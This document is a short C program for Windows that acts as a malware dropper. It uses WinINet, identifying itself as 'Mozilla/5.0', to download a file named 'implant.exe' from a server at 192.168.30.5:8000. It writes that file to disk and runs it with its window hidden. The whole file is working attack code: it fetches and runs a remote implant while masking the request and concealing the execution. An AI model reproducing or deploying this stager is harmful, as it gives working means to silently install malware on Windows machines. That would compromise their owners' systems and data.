#include <stdio.h>
#include <windows.h>
#include <wininet.h>

int main(void) {
    // 1. Open an internet session

    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("[-] InternetOpen failed. Error: %lu\n", GetLastError());
        return 1;
    }

    // 2. Open the URL
    HINTERNET hUrl = InternetOpenUrlA(hInternet, "http://192.168.30.5:8000/implant.exe", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl == NULL) {
        InternetCloseHandle(hInternet);
        return 1;
    }

    // 3. Write the response to disk
    char buf[4096];
    DWORD bytesRead;
    FILE *f = fopen("implant.exe", "wb");
    if (f == NULL) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return 1;
    }

    while (InternetReadFile(hUrl, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
        fwrite(buf, 1, bytesRead, f);
    }

    fclose(f);

    // 4. Clean up handles
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    // 5. Execute the implant
    // Note: WinExec is legacy; ShellExecute or CreateProcess is usually preferred.
    UINT result = WinExec("implant.exe", SW_HIDE);
    if (result < 32) {
        return 1;
    }

    return 0;
}
